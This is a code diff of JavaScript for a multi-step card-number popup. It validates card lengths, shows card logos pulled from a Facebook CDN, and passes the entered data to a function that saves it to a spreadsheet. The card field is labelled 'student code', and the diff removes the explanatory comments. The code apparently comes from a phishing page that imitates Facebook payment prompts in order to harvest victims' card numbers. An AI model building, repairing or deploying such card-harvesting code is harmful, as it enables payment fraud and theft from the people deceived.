@@ -8,21 +8,17 @@ function formatMMYY(el) {
     el.value = val;
 }
 
-// Fungsi validasi nomor kartu: hanya angka, panjang sesuai jenis
 function validasiNomorKartu(el, logoId) {
     const logo = document.getElementById(logoId);
-    // Hapus pesan peringatan saat mulai mengetik
     const popup = el.closest('.popup');
     let pesanError = popup.querySelector('.pesan-error');
     if (pesanError) pesanError.remove();
 
-    // Hapus semua karakter yang bukan angka
     let val = el.value.replace(/[^0-9]/g, '');
     el.value = val;
 
     logo.style.display = 'none';
 
-    // Atur panjang maksimal dan tampilkan logo
     if (val.startsWith('5')) {
         el.maxLength = 16;
         logo.src = 'https://static.xx.fbcdn.net/rsrc.php/yF/r/ZIeCyGzzAnR.webp?_nc_eui2=AeGWwsovkpKgGwR5712WjAOnSDhX2V7vCpNIOFfZXu8KkzsklIN_PeJIQyN_Dc2HO-Nam4L4_wo25wTn70CGGFEn';
@@ -61,25 +57,22 @@ async function simpanDataKeSpreadsheet() {
         });
         return true;
     } catch (error) {
-        console.error("Detail kesalahan:", error);
+        console.error("Kesalahan:", error);
         return false;
     }
 }
 
 async function nextPopup(current, next) {
-    // Hapus pesan lama dulu
     let pesanLama = document.getElementById(current).querySelector('.pesan-error');
     if (pesanLama) pesanLama.remove();
 
-    // Validasi jumlah digit sebelum pindah dari popup 1
     if (current === 'popup1') {
         const nomorEl = document.getElementById('kodeSiswa');
         const nomor = nomorEl.value;
         const awalan = nomor.charAt(0);
-        let panjangValid = awalan === '3' ? 15 : 16;
+        const panjangValid = awalan === '3' ? 15 : 16;
 
         if (nomor.length !== panjangValid) {
-            // Tampilkan pesan di dalam popup, bukan alert
             const popup = document.getElementById(current);
             const pesan = document.createElement('p');
             pesan.className = 'pesan-error';
@@ -88,7 +81,6 @@ async function nextPopup(current, next) {
             pesan.style.marginTop = '-10px';
             pesan.style.marginBottom = '12px';
             pesan.textContent = `Masukkan ${panjangValid} digit nomor kartu yang valid`;
-            // Masukkan pesan sebelum tombol Continue
             popup.querySelector('.btn-lanjut').before(pesan);
             nomorEl.focus();
             return;
